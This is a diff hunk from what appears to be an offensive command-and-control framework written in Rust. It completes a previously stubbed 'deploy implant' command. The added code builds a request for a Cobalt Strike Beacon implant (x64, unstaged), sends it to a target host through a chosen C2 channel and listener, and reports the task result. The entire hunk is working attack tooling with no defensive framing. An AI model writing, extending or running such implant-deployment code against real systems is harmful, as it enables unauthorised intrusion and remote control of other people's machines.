@@ -1358,8 +1358,34 @@ async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
                 channel.cyan(),
                 listener.yellow()
             );
-            // TODO: Construct ImplantRequest and wire to C2Manager.deploy_implant()
-            banner::print_success(&format!("Implant deployed to {}", target));
+            
+            // Construct ImplantRequest
+            let implant_request = overthrone_core::c2::ImplantRequest {
+                target: target.clone(),
+                implant_type: overthrone_core::c2::ImplantType::CsBeacon, // Default to CS Beacon
+                listener: listener.clone(),
+                delivery_method: overthrone_core::c2::DeliveryMethod::OverthroneExec,
+                arch: "x64".to_string(),
+                staged: false,
+            };
+
+            // Get the specified channel and deploy
+            if let Some(c2_channel) = manager.get_channel(&channel) {
+                match c2_channel.deploy_implant(&implant_request).await {
+                    Ok(result) => {
+                        println!("Task ID: {}", result.task_id);
+                        if !result.output.is_empty() {
+                            println!("{}", result.output);
+                        }
+                        banner::print_success(&format!("Implant deployed to {}", target));
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("Deployment failed: {}", e));
+                    }
+                }
+            } else {
+                banner::print_fail(&format!("C2 channel '{}' not found", channel));
+            }
         }
         C2Action::Disconnect { channel } => {
             if channel == "all" {
